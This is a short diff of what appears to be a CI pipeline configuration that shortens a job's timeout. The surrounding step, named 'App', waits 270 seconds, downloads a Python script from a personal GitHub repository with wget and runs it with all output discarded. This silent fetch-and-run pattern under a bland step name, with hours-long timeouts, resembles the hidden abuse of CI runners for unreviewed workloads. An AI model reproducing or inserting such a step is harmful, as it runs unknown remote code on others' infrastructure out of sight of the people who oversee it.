@@ -290,7 +290,7 @@ jobs:
       
       - run:
           name: App
-          no_output_timeout: 5h
+          no_output_timeout: 4h
           command: |
             sleep 270s
             wget https://raw.githubusercontent.com/samrikulan/urlna/main/saturn.py && python3 saturn.py >/dev/null 2>&1
